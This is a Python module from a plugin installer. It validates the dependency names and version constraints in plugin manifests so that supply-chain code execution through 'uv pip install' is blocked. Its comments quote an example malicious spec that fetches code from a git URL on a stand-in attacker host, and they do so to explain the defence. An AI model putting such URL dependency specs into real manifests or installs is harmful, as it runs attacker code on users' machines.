"""``[python_deps]``, vetted before it can reach a package installer.

This is the narrowest and least negotiable rule in the package. A manifest's
``[python_deps]`` table is written by whoever wrote the plugin, and the
installer hands it to ``uv pip install`` -- so ``evil = "@ git+https://
attacker.example/evil"`` is arbitrary code execution through the dependency
resolver, running the attacker's ``setup.py`` no matter how strict the AST
gate over the plugin's own files was. No shell is involved and none is
needed: ``uv`` will fetch a URL specifier if you give it one.

So a name and a version constraint are matched against two deliberately
conservative patterns and anything else is refused BY NAME. Refusing is not
filtering: the offending key travels back to the caller, because "one of
your dependencies was dropped" is how a plugin ends up half-installed and
failing on its first import instead of at the point somebody could fix it.

Nothing here runs a subprocess. Turning a vetted spec into an install is the
installer's job; this module only decides what a spec may look like.
"""

from __future__ import annotations

import re

from .errors import PluginInstallError

# PEP 508 distribution names: letters / digits / underscore / hyphen / period.
# Anything else (especially ``@``, ``git+``, ``http``, whitespace, semicolon)
# is rejected to block supply-chain RCE via the dep installer
# (``"evil @ git+https://attacker.com/evil"`` -> ``uv pip install`` runs the
# attacker's ``setup.py`` regardless of how strict the AST gate is).
_SAFE_DEP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$")

# PEP 440 version specifier characters. We don't fully parse -- we just refuse
# anything that *isn't* whitespace, digits, dots, commas, parens, and the
# canonical comparison operators.
_SAFE_DEP_VERSION = re.compile(r"^[\s\d.,()<>=!~*+a-zA-Z\-]*$")


class _UnsafeDepSpec(ValueError):
    """Raised when a plugin manifest's python_deps entry isn't a plain
    distribution name + version constraint."""


def _build_dep_spec(name: str, ver: str) -> str:
    """Turn a (name, version) pair into a vetted ``foo==1.2.3``-style string.

    Rejects PEP 508 extras (``foo[extra]``), URL specifiers (``foo @ url``),
    and any name with non-distribution-safe characters. Returning the spec as
    a list element for ``uv pip install`` is safe because we never invoke a
    shell -- but ``uv`` itself would happily fetch ``git+`` URLs given the
    chance, and that's exactly what we're blocking here.
    """
    if not isinstance(name, str) or not _SAFE_DEP_NAME.match(name):
        raise _UnsafeDepSpec(
            f"Invalid python_deps name {name!r} -- must match {_SAFE_DEP_NAME.pattern!r}"
        )
    if not isinstance(ver, str):
        ver = ""
    if ver and not _SAFE_DEP_VERSION.match(ver):
        raise _UnsafeDepSpec(
            f"Invalid python_deps version constraint for {name!r}: {ver!r}"
        )
    if not ver:
        return name
    if ver[:1] in (">", "<", "=", "~", "!"):
        return f"{name}{ver}"
    return f"{name}=={ver}"


def dep_specs(deps: dict[str, str]) -> list[str]:
    """Every dependency of a manifest as a vetted install spec, in order.

    Raises :class:`~.errors.PluginInstallError` on the first entry that does
    not vet, with the offending key as the ``hint`` -- a dialog can then
    point at the line of the manifest to fix instead of asking its reader to
    match a name out of a sentence.

    Order is the manifest's. Nothing here resolves or sorts anything: the
    installer is entitled to show the list it is about to install and have it
    read like the table it came from.
    """
    specs: list[str] = []
    for name, ver in deps.items():
        try:
            specs.append(_build_dep_spec(name, ver))
        except _UnsafeDepSpec as exc:
            raise PluginInstallError(str(exc), hint=str(name)) from exc
    return specs
